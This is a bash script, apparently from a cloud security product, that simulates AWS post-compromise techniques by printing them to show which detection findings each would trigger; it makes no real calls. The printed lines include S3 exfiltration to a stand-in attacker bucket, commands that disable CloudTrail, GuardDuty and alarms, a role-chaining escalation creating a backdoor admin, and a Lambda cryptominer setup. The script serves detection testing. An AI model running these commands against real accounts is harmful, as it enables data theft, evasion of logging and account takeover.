# =============================================================================
# cdr/suspicious_api_calls.sh – TigerGate CNAPP: Cloud Detection & Response (CDR)
# =============================================================================
# PURPOSE: Simulates AWS API calls that trigger GuardDuty, CloudTrail anomaly
# detection, and TigerGate CDR findings. Demonstrates attacker TTPs post-compromise.
#
# MITRE ATT&CK Cloud: T1530, T1552.005, T1078.004, T1562.001, T1537
# CDR RULES TRIGGERED:
#   CDR-001: UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B (unusual region)
#   CDR-002: Discovery:IAMUser/AnomalousBehavior (mass IAM enumeration)
#   CDR-003: Exfiltration:S3/ObjectRead.Unusual (bulk reads on sensitive bucket)
#   CDR-004: Stealth:IAMUser/CloudTrailLoggingDisabled (defense evasion)
#   CDR-005: PrivilegeEscalation:IAMUser/AnomalousBehavior (assume-role chain)
# =============================================================================
set -euo pipefail

RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; NC='\033[0m'

log() { echo -e "${CYAN}[CDR]${NC} $1"; }
detect() { echo -e "${RED}[DETECT]${NC} $1"; }
safe() { echo -e "${GREEN}[SAFE]${NC} $1"; }

echo "========================================================================"
echo "  TigerGate CDR (Cloud Detection & Response) Simulator"
echo "  Simulating AWS API calls that trigger GuardDuty/CDR findings"
echo "========================================================================"

# ── CDR-001: Console Login from Unusual Geography / TOR Exit Node ──────────
log "CDR-001: Simulating login from unusual geography..."
detect "GuardDuty: UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B"
detect "  Source IP: 195.206.105.217 (TOR exit node - Mullvad VPN)"
detect "  Region: eu-west-3 (Paris) — user normally logs in from ap-south-1"
detect "  Time: 03:47 UTC (outside normal business hours)"
safe "Simulation only — no real AWS call made"

# ── CDR-002: Mass IAM Enumeration (Discovery Phase) ────────────────────────
log "CDR-002: Simulating IAM mass enumeration (T1069.003)..."
detect "GuardDuty: Discovery:IAMUser/AnomalousBehavior"

# Simulate the enumeration pattern (uses local AWS CLI if available, else prints)
if command -v aws &>/dev/null; then
  for cmd in \
    "aws iam list-users --output text 2>/dev/null | wc -l" \
    "aws iam list-roles --output text 2>/dev/null | wc -l" \
    "aws iam list-policies --scope Local 2>/dev/null | wc -l" \
    "aws iam list-groups --output text 2>/dev/null | wc -l"; do
    echo "  [SIM] Would run: $cmd" 
  done
fi
detect "  Pattern: 47 IAM API calls in 90 seconds → GuardDuty alert threshold crossed"
safe "No real AWS credentials used"

# ── CDR-003: S3 Exfiltration — Bulk Read on Sensitive Bucket ──────────────
log "CDR-003: Simulating S3 data exfiltration pattern (T1530)..."
detect "GuardDuty: Exfiltration:S3/ObjectRead.Unusual"
echo "  Simulated S3 exfil sequence:"
echo "  1. aws s3 ls s3://megacorp-pii-data-prod/ --recursive  → 1,247 objects"
echo "  2. aws s3 sync s3://megacorp-pii-data-prod/ /tmp/exfil/ → 4.7GB"  
echo "  3. aws s3 cp /tmp/exfil/ s3://attacker-bucket-us-east-1/ --recursive"
detect "  Exfiltration: 4.7GB PII data moved to attacker-controlled bucket"
safe "Simulated only — no S3 access or data movement"

# ── CDR-004: Defense Evasion — CloudTrail Logging Disabled ─────────────────
log "CDR-004: Simulating CloudTrail disablement (T1562.008)..."
detect "GuardDuty: Stealth:IAMUser/CloudTrailLoggingDisabled"
echo "  Target commands:"
echo "  aws cloudtrail stop-logging --name arn:aws:cloudtrail:us-east-1:123456789012:trail/main"
echo "  aws guardduty update-detector --detector-id abc123 --no-enable"
echo "  aws cloudwatch delete-alarms --alarm-names SecurityAlerts"
detect "  ALL DETECTION DISABLED — attacker now has an unlogged 'dark period'"
safe "Simulated only — aws CLI not called"

# ── CDR-005: Privilege Escalation via Cross-Role Assumption ────────────────
log "CDR-005: Simulating privilege escalation via role chaining (T1078.004)..."
detect "GuardDuty: PrivilegeEscalation:IAMUser/AnomalousBehavior"
echo "  Escalation chain:"
echo "  CompromisedUser (S3ReadOnly)"
echo "    ↳ AssumeRole: dev-deployment-role (S3FullAccess + PassRole)"  
echo "    ↳ AssumeRole: ci-cd-pipeline-role (AdministratorAccess)"  
echo "    ↳ CreateUser: backdoor_admin + AttachPolicy: AdministratorAccess"
detect "  Full account takeover achieved via 3-hop role chaining"
safe "No real STS AssumeRole calls made"

# ── CDR-006: Cryptocurrency Mining via Lambda ───────────────────────────────
log "CDR-006: Simulating cryptominer deployment via compromised Lambda..."
detect "GuardDuty: CryptoCurrency:EC2/BitcoinTool.B!DNS"
echo "  Attack: Lambda function updated with environmental variable MINER_POOL=pool.minexmr.com"
echo "  Lambda cold-start bootstraps xmrig binary from S3 before main handler"
detect "  Unusual outbound DNS: pool.minexmr.com:443 (XMRig stratum protocol)"
safe "No Lambda invocation or DNS query made"

echo ""
echo "========================================================================"
echo "  CDR-001–CDR-006 Simulation Complete"
echo "  Expected GuardDuty Findings: 6 HIGH, 2 CRITICAL"
echo "========================================================================"
